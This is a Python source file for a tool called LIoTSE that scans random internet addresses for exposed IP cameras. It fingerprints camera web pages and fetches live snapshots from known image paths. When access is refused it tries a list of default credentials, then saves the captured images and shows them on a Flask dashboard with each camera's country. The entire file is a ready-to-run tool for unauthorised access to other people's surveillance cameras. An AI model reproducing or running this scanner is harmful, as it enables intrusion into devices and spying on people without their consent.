import socket
import requests
import random
import time
import threading
import os
import sys
from datetime import datetime
from colorama import init, Fore, Style
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
from flask import Flask, render_template_string, Response, jsonify
import json

# PYTHON 3.12+
if sys.version_info >= (3, 12):
    import pkgutil
    import importlib
    if not hasattr(pkgutil, 'get_loader'):
        pkgutil.get_loader = importlib.util.find_spec

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
VERSION = "6.0-smooth"

PORTS = [80, 81, 82, 83, 84, 85, 88, 443, 554, 8000, 8001, 8008, 8080, 8081, 8082, 8083, 8084, 8085, 8888, 9000, 10000, 37777, 554, 8554]

THREADS = 50
PORT_WORKERS = 12
BASE_DELAY = 0.38
TIMEOUT = 2.6

os.makedirs("screenshots", exist_ok=True)

seen_ips = set()
cameras_found = []
cameras_lock = threading.Lock()
scan_count = 0

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15"
]

CAMERA_POSITIVE = [
    "hikvision", "dahua", "amcrest", "foscam", "axis", "vivotek", "netwave", "contacam",
    "avigilon", "blue iris", "ui3", "ipcam client", "geovision", "geoserver", "i-catcher",
    "webcamxp", "webcam 7", "yawcam", "linksys", "wvc80n", "vb-m600", "merit lilin",
    "acti", "reolink", "netsurveillance", "ip camera", "cctv", "dvr", "nvr", "ptz",
    "mjpeg", "live view", "snapshot", "realmonitor", "isapi", "onvif", "live.sdp",
    "network camera", "webcam live", "camera stream", "ip webcam", "security camera",
    "surveillance", "backdoor", "exploit", "web view", "video stream", "motion detect",
    "channel=1", "streaming/channels", "camera login", "live video"
]

STRONG_KEYWORDS = [
    "hikvision ip camera", "ipcam client", "geovision", "contacam", "vvtK-http-server",
    "avigilon", "netwave ip camera", "ui3 -", "merit lilin", "yawcam", "webcamxp",
    "webcam 7", "i-catcher console", "network camera vb-m600", "wvc80n",
    "blue iris remote view", "hik-exploit", "tm01"
]

TITLE_BLACKLIST = [
    "no title", "sorry, the website has been stopped", "login",
    "xampp", "apache", "ubuntu", "debian", "nginx", "cpanel", "plesk", "whm", "at&t",
    "router login", "admin login", "default page", "index of", "welcome to", "401 unauthorized",
    "forbidden", "directory listing", "iis", "tomcat", "jenkins", "grafana", "phpmyadmin",
    "webmin", "netdata", "synology", "qnap", "wordpress", "joomla", "cloudflare", "error",
    "not found", "under construction", "coming soon", "maintenance", "403 forbidden",
    "bad gateway", "502 bad gateway", "service unavailable", "redirecting", "dashboard",
    "web server", "file manager", "panel", "hosting", "vps", "dedicated server"
]

SNAPSHOT_PATHS = [
    "/snapshot.jpg", "/out.jpg", "/img/snapshot.cgi", "/cgi-bin/snapshot.cgi", "/image.jpg",
    "/ISAPI/Streaming/Channels/101/picture", "/cam/realmonitor?channel=1&subtype=0",
    "/axis-cgi/jpg/image.cgi", "/snap.jpg", "/shot.jpg", "/mjpg/video.mjpg",
    "/cgi-bin/mjpg/video.cgi", "/videostream.cgi", "/jpg/image.jpg", "/api/snapshot",
    "/tmpfs/auto.jpg", "/onvif/media_service/snapshot", "/cgi-bin/snapshot.cgi?channel=1"
]

COMMON_CREDS = [
    ("admin", "admin"), ("admin", "12345"), ("admin", "888888"), ("admin", ""),
    ("admin", "123456"), ("root", "admin"), ("admin", "password"), ("admin", "admin123")
]

app = Flask("camera_scanner")  

HTML_TEMPLATE = """ 
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>6.0 Scanner</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        :root {
            --bg: #0d0d0d;
            --surface: #1f1f1f;
            --text: #e0e0e0;
            --accent: #00cc88;
        }
        body {
            font-family: 'Segoe UI', system-ui, sans-serif;
            background: var(--bg);
            color: var(--text);
            margin: 0;
            padding: 20px;
        }
        h1 {
            text-align: center;
            color: var(--accent);
            margin-bottom: 10px;
            font-weight: 500;
        }
        .controls {
            max-width: 1300px;
            margin: 0 auto 25px;
            display: flex;
            flex-wrap: wrap;
            gap: 12px;
            background: var(--surface);
            padding: 16px;
            border-radius: 8px;
            align-items: center;
        }
        input, select, button {
            padding: 10px 14px;
            border: none;
            border-radius: 6px;
            background: #2a2a2a;
            color: white;
        }
        button {
            background: var(--accent);
            color: #000;
            font-weight: 600;
            cursor: pointer;
        }
        button:hover { background: #00aa66; }
        .stats {
            text-align: center;
            color: #999;
            margin-bottom: 20px;
            font-size: 15.8px;
            font-weight: 500;
        }
        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(370px, 1fr));
            gap: 24px;
            max-width: 1480px;
            margin: 0 auto;
        }
        .card {
            background: var(--surface);
            border: 1px solid #333;
            border-radius: 10px;
            overflow: hidden;
            box-shadow: 0 8px 20px rgba(0,0,0,0.6);
        }
        .card img { width: 100%; height: 220px; object-fit: cover; }
        .no-screenshot {
            height: 220px;
            background: #222;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #555;
            font-size: 15px;
        }
        .card-body { padding: 16px; }
        .card h3 { margin: 0 0 12px 0; color: var(--accent); font-size: 18px; word-break: break-all; }
        .card a { color: #44aaff; text-decoration: none; }
        .card a:hover { text-decoration: underline; }
        .info { font-size: 14.2px; line-height: 1.6; color: #ccc; }
        .info strong { color: #aaa; }
        .links { margin-top: 14px; font-size: 13.5px; }
        .links a { display: block; margin-bottom: 3px; word-break: break-all; }
    </style>
</head>
<body>
    <h1>LIoTSE 6.0</h1>
    <div class="stats" id="stats">Scanned: 0 | Found: 0 | Uptime: 0 minutes</div>

    <div class="controls">
        <input type="text" id="search" placeholder="Search IP, Title or Country" style="flex: 1; min-width: 280px;">

        <select id="sort">
            <option value="newest">Newest First</option>
            <option value="oldest">Oldest First</option>
            <option value="country">Country A-Z</option>
        </select>

        <select id="filter" onchange="setFilter()">
            <option value="all">All Cameras</option>
            <option value="with">With Screenshot</option>
            <option value="without">Without Screenshot</option>
        </select>

        <button onclick="refreshView()">Refresh View</button>
    </div>

    <div class="grid" id="grid"></div>

    <script>
        let currentFilter = 'all';
        let cameras = [];
        let scanned = 0;
        let found = 0;
        let startTime = Date.now();

        function saveData() {
            localStorage.setItem('cameras', JSON.stringify(cameras));
            localStorage.setItem('scanned', scanned);
            localStorage.setItem('found', found);
            localStorage.setItem('startTime', startTime);
        }

        function updateStatsDisplay() {
            const uptime = Math.floor((Date.now() - startTime) / 60000);
            document.getElementById('stats').innerHTML = 
                `Scanned: ${scanned} | Found: ${found} | Uptime: ${uptime} minutes`;
        }

        const eventSource = new EventSource('/events');
        eventSource.onmessage = function(event) {
            const data = JSON.parse(event.data);
            if (data.type === 'new_camera') {
                cameras.unshift(data.camera);
                found = cameras.length;
                saveData();
                updateStatsDisplay();
                render();
            } else if (data.type === 'scan_update') {
                scanned = data.scanned;
                saveData();
                updateStatsDisplay();
            }
        };

        function setFilter() {
            currentFilter = document.getElementById('filter').value;
            render();
        }

        function refreshView() {
            render();
        }

        function render() {
            const grid = document.getElementById('grid');
            const searchTerm = document.getElementById('search').value.toLowerCase().trim();
            const sortMode = document.getElementById('sort').value;

            let filtered = cameras.filter(cam => {
                if (!searchTerm) return true;
                const text = (cam.ip + " " + (cam.title || "") + " " + (cam.country || "")).toLowerCase();
                return text.includes(searchTerm);
            });

            if (currentFilter === 'with') filtered = filtered.filter(cam => cam.has_screenshot);
            else if (currentFilter === 'without') filtered = filtered.filter(cam => !cam.has_screenshot);

            if (sortMode === 'newest') filtered.sort((a,b) => b.timestamp - a.timestamp);
            else if (sortMode === 'oldest') filtered.sort((a,b) => a.timestamp - a.timestamp);
            else if (sortMode === 'country') filtered.sort((a,b) => (a.country || "").localeCompare(b.country || ""));

            grid.innerHTML = '';
            filtered.forEach(cam => {
                const div = document.createElement('div');
                div.className = 'card';

                const imgHtml = cam.screenshot_url 
                    ? `<a href="${cam.screenshot_url}" target="_blank"><img src="${cam.screenshot_url}" alt="Screenshot"></a>`
                    : `<div class="no-screenshot">No Screenshot Available</div>`;

                let linksHtml = cam.direct_links && cam.direct_links.length 
                    ? '<div class="links"><strong>Direct Links:</strong><br>' + 
                      cam.direct_links.map(l => `<a href="${l}" target="_blank">${l}</a>`).join('') + '</div>' 
                    : '';

                div.innerHTML = `
                    ${imgHtml}
                    <div class="card-body">
                        <h3><a href="http://${cam.ip}:${cam.main_port}" target="_blank">${cam.ip}</a></h3>
                        <div class="info">
                            <strong>Title:</strong> ${cam.title || "No Title"}<br>
                            <strong>Country:</strong> ${cam.country || "Unknown"}<br>
                            <strong>All Open Ports:</strong> ${cam.open_ports.join(", ")}<br>
                            <strong>Webcam Ports:</strong> ${cam.webcam_ports.join(", ")}<br>
                            <strong>Screenshot:</strong> ${cam.has_screenshot ? "Yes" : "No"}<br>
                            <strong>Discovered:</strong> ${cam.time}<br>
                        </div>
                        ${linksHtml}
                    </div>
                `;
                grid.appendChild(div);
            });
        }

        document.getElementById('search').addEventListener('input', render);
        document.getElementById('sort').addEventListener('change', render);

        render();
        setInterval(updateStatsDisplay, 30000);
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/events')
def events():
    def generate():
        last_index = 0
        while True:
            with cameras_lock:
                yield f"data: {json.dumps({'type': 'scan_update', 'scanned': scan_count})}\n\n"
                
                if len(cameras_found) > last_index:
                    for cam in cameras_found[last_index:]:
                        yield f"data: {json.dumps({'type': 'new_camera', 'camera': cam})}\n\n"
                    last_index = len(cameras_found)
            time.sleep(0.8)
    return Response(generate(), mimetype="text/event-stream")

def is_likely_camera(text: str, title: str, headers: dict) -> bool:
    title_lower = title.lower().strip()
    combined = (text + " " + title).lower()
    server = headers.get("Server", "").lower()

    if any(kw in title_lower for kw in STRONG_KEYWORDS) or any(kw in server for kw in ["hikvision", "dahua", "vvtK", "geovision", "webcamxp", "i-catcher"]):
        return True
    if any(kw in combined for kw in CAMERA_POSITIVE):
        if any(black in title_lower for black in TITLE_BLACKLIST):
            return False
        return True
    return False

def try_get_snapshot(ip: str, port: int):
    headers = {"User-Agent": random.choice(USER_AGENTS), "Accept": "image/*"}
    for path in SNAPSHOT_PATHS:
        try:
            url = f"http://{ip}:{port}{path}"
            r = requests.get(url, timeout=TIMEOUT, headers=headers, stream=True, verify=False)
            if r.status_code == 200 and 'image' in r.headers.get('content-type', '').lower():
                if len(r.content) > 5200:
                    return r.content, url
            if r.status_code in (401, 403):
                for user, pwd in COMMON_CREDS[:7]:
                    try:
                        auth = requests.auth.HTTPBasicAuth(user, pwd)
                        r = requests.get(url, auth=auth, timeout=TIMEOUT, headers=headers, stream=True, verify=False)
                        if r.status_code == 200 and 'image' in r.headers.get('content-type', '').lower():
                            if len(r.content) > 5200:
                                return r.content, url
                    except:
                        continue
        except:
            continue
    return None, None

def save_screenshot(ip: str, port: int, data: bytes):
    try:
        filename = f"screenshots/{ip}_{port}_{int(time.time())}.jpg"
        with open(filename, "wb") as f:
            f.write(data)
        return filename
    except:
        return None

def check_port(ip: str, port: int):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1.7)
        result = sock.connect_ex((ip, port))
        sock.close()
        return port if result == 0 else None
    except:
        return None

def get_country(ip: str):
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=country", timeout=4)
        return r.json().get("country", "Unknown") if r.status_code == 200 else "Unknown"
    except:
        return "Unknown"

def generate_random_ip():
    first = random.choices(list(range(1, 224)) + [24, 45, 68, 72, 76, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99],
                           weights=[1]*223 + [3]*23, k=1)[0]
    return f"{first}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

def scan_ip(ip: str):
    global scan_count
    scan_count += 1
    if ip in seen_ips:
        return
    seen_ips.add(ip)

    print(Fore.CYAN + f"[SCAN #{scan_count}] {ip}" + Style.RESET_ALL, end="\r")

    open_ports = []
    with ThreadPoolExecutor(max_workers=PORT_WORKERS) as executor:
        futures = [executor.submit(check_port, ip, p) for p in PORTS]
        for f in as_completed(futures):
            res = f.result()
            if res:
                open_ports.append(res)

    if not open_ports:
        return

    for port in open_ports:
        try:
            r = requests.get(f"http://{ip}:{port}", timeout=TIMEOUT,
                             headers={"User-Agent": random.choice(USER_AGENTS)}, allow_redirects=True)

            if r.status_code not in (200, 401, 403):
                continue
            if len(r.text) < 900:
                continue

            text = r.text[:3400]
            title = "No Title"
            lower = text.lower()

            if "<title>" in lower:
                s = lower.find("<title>") + 7
                e = lower.find("</title>", s)
                if e > s:
                    title = text[s:e].strip()[:200]

            if not is_likely_camera(text, title, r.headers):
                continue

            snapshot_bytes, snapshot_url = try_get_snapshot(ip, port)

            if snapshot_bytes:
                save_screenshot(ip, port, snapshot_bytes)
                print(Fore.GREEN + f"\n[VALID + SCREENSHOT] {ip}:{port}" + Style.RESET_ALL)
            else:
                print(Fore.YELLOW + f"\n[VALID CAMERA] {ip}:{port}" + Style.RESET_ALL)

            webcam_entries = [(port, title)]

            country = get_country(ip)
            cam_data = {
                "ip": ip,
                "title": title,
                "country": country,
                "open_ports": sorted(open_ports),
                "webcam_ports": [str(p) for p, _ in webcam_entries],
                "main_port": port,
                "has_screenshot": bool(snapshot_bytes),
                "screenshot_url": snapshot_url,
                "direct_links": [f"http://{ip}:{p}" for p, _ in webcam_entries],
                "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "timestamp": time.time()
            }

            with cameras_lock:
                cameras_found.append(cam_data)

            return

        except:
            continue

def worker():
    while True:
        ip = generate_random_ip()
        scan_ip(ip)
        time.sleep(BASE_DELAY + random.uniform(0.15, 0.50))

def main():
    try:
        print(Fore.WHITE + f"LIoTSE v{VERSION}." + Style.RESET_ALL)
        print(Fore.GREEN + "Running > http://localhost:8000" + Style.RESET_ALL)
        print(Fore.YELLOW + "Press Ctrl+C to stop !" + Style.RESET_ALL)

        for _ in range(THREADS):
            t = threading.Thread(target=worker, daemon=False)   # Changed to False
            t.start()
            time.sleep(0.04)

        app.run(host="0.0.0.0", port=8000, debug=False)

    except KeyboardInterrupt:
        print(Fore.RED + "\nLIoTSE stopped." + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"\nError: {e}" + Style.RESET_ALL)

if __name__ == "__main__":
    init(autoreset=True)
    main()
